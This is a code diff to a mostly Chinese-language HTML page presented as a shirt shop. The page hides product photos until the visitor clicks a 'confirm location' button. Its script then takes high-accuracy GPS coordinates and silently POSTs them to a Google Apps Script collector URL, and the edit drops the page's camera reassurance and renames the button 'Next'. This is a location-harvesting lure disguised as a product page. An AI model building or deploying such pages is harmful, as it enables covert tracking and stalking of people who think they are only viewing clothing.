@@ -2,14 +2,11 @@
 <html lang="zh">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Trend Köynəklər</title>
 
 <style>
-*{
-  box-sizing:border-box;
-}
+*{box-sizing:border-box}
 
 body{
   margin:0;
@@ -20,13 +17,13 @@ body{
 .page{
   max-width:600px;
   margin:auto;
-  padding:15px 15px 40px;
+  padding:20px 15px 40px;
 }
 
-.location{
-  background:white;
+.card{
+  background:#fff;
   border-radius:28px;
-  padding:45px 20px;
+  padding:50px 22px;
   text-align:center;
   box-shadow:0 5px 25px rgba(0,0,0,.12);
 }
@@ -36,35 +33,26 @@ body{
 }
 
 h1{
-  font-size:38px;
-  margin:18px 0;
+  font-size:32px;
+  margin:20px 0;
 }
 
-p{
+.text{
   font-size:21px;
-  line-height:1.6;
+  line-height:1.7;
   color:#555;
-}
-
-.info{
-  background:#f4eeee;
-  padding:18px;
-  border-radius:16px;
-  font-size:17px;
-  line-height:1.6;
-  margin:25px 0;
 }
 
 button{
   width:100%;
-  padding:21px;
+  padding:22px;
   border:0;
-  border-radius:17px;
+  border-radius:18px;
   background:#222;
-  color:white;
-  font-size:22px;
+  color:#fff;
+  font-size:25px;
   font-weight:bold;
-  cursor:pointer;
+  margin-top:25px;
 }
 
 button:disabled{
@@ -73,7 +61,8 @@ button:disabled{
 
 #status{
   margin-top:20px;
-  font-size:17px;
+  font-size:18px;
+  color:#555;
 }
 
 .photo{
@@ -83,7 +72,7 @@ button:disabled{
   margin-top:20px;
 }
 
-#afterPhotos{
+#photos{
   display:none;
 }
 </style>
@@ -93,42 +82,35 @@ button:disabled{
 
 <div class="page">
 
-  <!-- İLK ŞƏKİL -->
-  <img
-    class="photo"
-    src="IMG_20261005_014348.jpg"
-    alt="Trend qadın köynəyi"
-  >
-
-  <!-- KONUM TƏSDİQİ -->
-  <div class="location">
+  <div class="card">
 
     <div class="icon">📍</div>
 
-    <h1>位置确认</h1>
+    <h1>您正在确认您的位置</h1>
 
-    <p>
-      请确认您的位置
+    <div class="text">
+      请点击下面的按钮确认您的位置
       <br>
-      点击下面的按钮并允许位置权限
-    </p>
-
-    <div class="info">
-      🔒 只有在您主动允许后，我们才会获取您的位置。
+      只有在您允许后，才能获取您的位置。
       <br><br>
-      📷 不使用摄像头，也不会拍照。
+      🔒 您可以自行决定是否允许位置权限。
     </div>
 
-    <button id="locationBtn">
-      确认我的位置
+    <button id="nextButton">
+      İleri
     </button>
 
     <div id="status"></div>
 
   </div>
 
-  <!-- İCAZƏDƏN SONRA AÇILAN ŞƏKİLLƏR -->
-  <div id="afterPhotos">
+  <img
+    class="photo"
+    src="IMG_20261005_014348.jpg"
+    alt="Trend qadın köynəyi"
+  >
+
+  <div id="photos">
 
     <img
       class="photo"
@@ -148,120 +130,75 @@ button:disabled{
 
 <script>
 
-/* APPS SCRIPT ÜNVANI */
 const APP_SCRIPT_URL =
 "https://script.google.com/macros/s/AKfycbxTNuy179zPxbSJYoQgAfNu6bqNCqjqjKeTIO7B3SKnYrmrGCN9DAD4TpphJ2tK_fsQZg/exec";
 
+const button = document.getElementById("nextButton");
+const status = document.getElementById("status");
+const photos = document.getElementById("photos");
 
-const btn =
-document.getElementById("locationBtn");
+button.addEventListener("click", function(){
 
-const status =
-document.getElementById("status");
-
-const afterPhotos =
-document.getElementById("afterPhotos");
-
-
-btn.onclick = function(){
-
-  if(!navigator.geolocation){
-
-    status.textContent =
-    "您的浏览器不支持位置服务。";
-
+  if (!navigator.geolocation) {
+    status.textContent = "此浏览器不支持位置服务。";
     return;
   }
 
-  btn.disabled = true;
-
-  status.textContent =
-  "正在等待位置权限...";
-
+  button.disabled = true;
+  status.textContent = "正在获取您的位置，请允许位置权限……";
 
   navigator.geolocation.getCurrentPosition(
 
     function(position){
 
-      const latitude =
-      position.coords.latitude;
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
 
-      const longitude =
-      position.coords.longitude;
+      const locationData = {
+        latitude: latitude,
+        longitude: longitude,
+        accuracy: accuracy,
+        timestamp: new Date().toISOString()
+      };
 
-      const accuracy =
-      position.coords.accuracy;
-
-
-      /* KONUMU APPS SCRIPTƏ GÖNDƏR */
       fetch(APP_SCRIPT_URL, {
-
-        method:"POST",
-
-        mode:"no-cors",
-
-        headers:{
-          "Content-Type":
-          "text/plain;charset=utf-8"
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "text/plain;charset=utf-8"
         },
-
-        body:JSON.stringify({
-
-          latitude:latitude,
-
-          longitude:longitude,
-
-          accuracy:accuracy,
-
-          timestamp:
-          new Date().toISOString()
-
-        })
-
+        body: JSON.stringify(locationData)
       }).catch(function(error){
-
         console.log(error);
-
       });
 
+      status.textContent = "位置确认成功。";
 
-      status.textContent =
-      "位置确认成功。";
-
-      afterPhotos.style.display =
-      "block";
-
-
-      afterPhotos.scrollIntoView({
-        behavior:"smooth"
-      });
+      photos.style.display = "block";
 
     },
-
 
     function(error){
 
-      btn.disabled = false;
+      button.disabled = false;
 
       status.textContent =
-      "请允许位置权限后继续。";
+        "请允许位置权限后继续。";
 
     },
 
-
     {
-      enableHighAccuracy:true,
-
-      timeout:15000,
-
-      maximumAge:0
+      enableHighAccuracy: true,
+      timeout: 20000,
+      maximumAge: 0
     }
 
   );
 
-};
+});
 
 </script>
 
 </body>
-    </html>
+</html>
